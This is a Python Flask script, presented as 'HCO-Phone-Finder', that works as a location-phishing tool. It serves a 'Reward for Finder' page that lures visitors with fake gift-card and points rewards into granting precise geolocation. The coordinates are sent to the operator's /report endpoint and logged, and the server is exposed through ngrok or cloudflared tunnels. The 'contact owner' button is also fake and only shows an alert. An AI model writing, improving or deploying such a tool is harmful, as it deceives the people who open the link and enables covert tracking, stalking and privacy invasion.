#!/usr/bin/env python3
"""
HCO-Phone-Finder - A Tool to Help Track your Stolen Phone 📱
Author: Azhar
"""

import os
import sys
import subprocess
import threading
import time
from flask import Flask, render_template_string, request, jsonify

# -------- CONFIG --------
PORT = 5000

# HTML page (enhanced)
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reward for Finder</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#1a2a6c,#b21f1f,#fdbb2d);color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
.container{width:100%;max-width:450px;animation:fadeIn 0.8s ease-out;position:relative;}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
.card{background: rgba(255,255,255,0.1);backdrop-filter: blur(12px);border-radius:20px;padding:2rem;text-align:center;box-shadow:0 12px 30px rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.2);overflow:hidden;position:relative;}
.card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);z-index:-1;}
.reward-badge{position:absolute;top:-10px;right:-10px;background: linear-gradient(45deg, #FFD700, #FFA500); color:#000;font-weight:bold;padding:10px 20px;border-radius:25px;font-size:0.85rem;box-shadow:0 5px 15px rgba(0,0,0,0.3);transform: rotate(5deg);animation: bounceBadge 1.2s infinite alternate;}
@keyframes bounceBadge{0%{transform:rotate(5deg) translateY(0);}100%{transform:rotate(5deg) translateY(-8px);}}
.logo{width:90px;height:90px;margin:0 auto 1.5rem;background: rgba(255,255,255,0.2);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:2.2rem;box-shadow:0 5px 15px rgba(0,0,0,0.2);animation:logoSpin 3s linear infinite;}
@keyframes logoSpin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
h2{font-size:1.9rem;margin-bottom:1rem;background:linear-gradient(45deg,#fff,#FFD700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700;}
p{margin-bottom:1rem;line-height:1.6;font-weight:300;}
.highlight{color:#FFD700;font-weight:500;}
.btn-container{margin:2rem 0 1rem;display:flex;flex-direction:column;gap:10px;}
.allow-btn{background: linear-gradient(45deg,#00C9FF,#92FE9D);border:none;color:#000;font-weight:600;padding:1rem 2rem;border-radius:50px;cursor:pointer;font-size:1.1rem;width:100%;transition:all 0.3s ease;position:relative;overflow:hidden;box-shadow:0 5px 15px rgba(0,0,0,0.2);}
.allow-btn:hover{transform:translateY(-3px);box-shadow:0 8px 20px rgba(0,0,0,0.3);}
.allow-btn:active{transform:translateY(1px);}
.allow-btn::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background: linear-gradient(90deg,transparent, rgba(255,255,255,0.4), transparent);transform:translateX(-100%);}
.allow-btn:hover::after{animation: shimmer 1.5s infinite;}
@keyframes shimmer{100%{transform:translateX(100%);}}
.status{margin-top:1.5rem;padding:1rem;border-radius:10px;background: rgba(255,255,255,0.1);display:none;}
.status.success{display:block;background: rgba(46,204,113,0.2);border:1px solid rgba(46,204,113,0.5);}
.status.error{display:block;background: rgba(231,76,60,0.2);border:1px solid rgba(231,76,60,0.5);}
.contact-btn{background:#ff7f50;color:#000;font-weight:600;padding:0.9rem 1.8rem;border-radius:50px;border:none;cursor:pointer;font-size:1rem;width:100%;transition:0.3s;}
.contact-btn:hover{transform:translateY(-2px);box-shadow:0 6px 15px rgba(0,0,0,0.3);}
.loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle;}
@keyframes spin{to{transform:rotate(360deg);}}
.footer{margin-top:1.5rem;font-size:0.8rem;opacity:0.8;text-align:center;}
.reward-options{display:flex;justify-content:space-between;gap:10px;margin-top:1rem;}
.reward-options button{flex:1;padding:0.8rem;border-radius:50px;border:none;font-weight:600;cursor:pointer;transition:0.3s;}
.reward-options button:hover{transform:translateY(-2px);}
.reward-card{margin-top:1rem;font-size:0.95rem;color:#fff;}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="reward-badge">REWARD</div>
<div class="logo">🎁</div>
<h2>Thank You for Finding This Phone!</h2>
<p>If you found this device, please help return it to its owner.</p>
<p>You'll receive a <span class="highlight">thank-you reward</span> once your location is verified!</p>

<div class="reward-options">
<button data-type="points">Bonus Points</button>
<button data-type="gift">Gift Card</button>
<button data-type="message">Thank You Note</button>
</div>
<div class="reward-card" id="rewardInfo">Select a reward option above to see details!</div>

<div class="btn-container">
<button class="allow-btn" id="allowBtn"><span class="btn-text">Allow Location to Claim Reward</span></button>
<button class="contact-btn" id="contactBtn">Contact Owner (Optional)</button>
</div>

<div class="status" id="statusMsg"></div>
<div class="footer">Your location data will only be used to verify the return process.</div>
</div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function(){
const allowBtn=document.getElementById('allowBtn');
const statusMsg=document.getElementById('statusMsg');
const btnText=document.querySelector('.btn-text');
const rewardInfo=document.getElementById('rewardInfo');
const rewardButtons=document.querySelectorAll('.reward-options button');
const contactBtn=document.getElementById('contactBtn');

rewardButtons.forEach(btn=>{btn.addEventListener('click',()=>{const type=btn.dataset.type;switch(type){case'points':rewardInfo.textContent='You will receive 100 bonus points credited to your account once location is verified!';break;case'gift':rewardInfo.textContent='You will receive a $10 gift card after your location is verified!';break;case'message':rewardInfo.textContent='A personalized thank-you note will be sent to you once location is verified!';break;}});});

contactBtn.addEventListener('click',()=>{alert("Thank you! Your message has been sent to the owner.");});

allowBtn.addEventListener('click',requestLocation);

function requestLocation(){
statusMsg.className='status';
btnText.innerHTML='<span class="loader"></span> Requesting Location...';
allowBtn.disabled=true;
if(!navigator.geolocation){showError('Geolocation not supported by your browser.');return;}
navigator.geolocation.getCurrentPosition(
function(position){const lat=position.coords.latitude;const lon=position.coords.longitude;const acc=position.coords.accuracy;btnText.textContent='Location Received!';statusMsg.className='status success';statusMsg.innerHTML=`<strong>Thank you!</strong><br>Your location has been received. Reward verification is in progress.`;fetch('/report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude:lat,longitude:lon,accuracy:acc,timestamp:Date.now()})}).then(res=>console.log('Location data sent.')).catch(err=>console.error(err));startConfetti();},
function(error){let msg='Unable to retrieve your location. ';switch(error.code){case error.PERMISSION_DENIED:msg+='Please allow location access to claim your reward.';break;case error.POSITION_UNAVAILABLE:msg+='Location information unavailable.';break;case error.TIMEOUT:msg+='Location request timed out.';break;default:msg+='Unknown error occurred.';}showError(msg);},
{enableHighAccuracy:true,timeout:10000,maximumAge:0});}

function showError(message){statusMsg.className='status error';statusMsg.innerHTML=`<strong>Location Access Needed</strong><br>${message}`;btnText.textContent='Try Again';allowBtn.disabled=false;}

function startConfetti(){const duration=2*1000;const end=Date.now()+duration;(function frame(){const confetti=document.createElement('div');confetti.style.position='fixed';confetti.style.top=Math.random()*100+'%';confetti.style.left=Math.random()*100+'%';confetti.style.width='10px';confetti.style.height='10px';confetti.style.background='gold';confetti.style.borderRadius='50%';confetti.style.opacity=Math.random();document.body.appendChild(confetti);setTimeout(()=>confetti.remove(),2000);if(Date.now()<end)requestAnimationFrame(frame);})();}
});
</script>
</body>
</html>
"""

# Flask app
app = Flask(__name__)

locations = []

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/report', methods=['POST'])
def report():
    data = request.get_json()
    locations.append(data)
    print(f"[LOCATION] Lat:{data['latitude']} Lon:{data['longitude']} Accuracy:{data['accuracy']} Timestamp:{data['timestamp']}")
    return jsonify({"status":"ok"})

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# -------- Tunnel setup --------
def start_ngrok():
    print("[*] Starting ngrok...")
    os.system(f"ngrok http {PORT} > /dev/null &")
    time.sleep(5)
    # Fetch public URL
    result = subprocess.getoutput("curl -s localhost:4040/api/tunnels | grep -Po '(?<=public_url\": \")[^\"]+'")
    print(f"[NGROK LINK] {result}")

def start_cloudflare():
    print("[*] Starting cloudflared...")
    os.system(f"cloudflared tunnel --url http://localhost:{PORT} > /dev/null &")
    time.sleep(5)
    print("[*] Visit your cloudflared link from the terminal above.")

# Main
if __name__=="__main__":
    print("Select tunnel method:")
    print("1) ngrok")
    print("2) cloudflared")
    choice = input("Choose 1 or 2: ")
    threading.Thread(target=run_flask).start()
    time.sleep(2)
    if choice.strip()=="1":
        start_ngrok()
    else:
        start_cloudflare()
    print("[*] Server running! Open the link above to test.")
    print("[*] Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
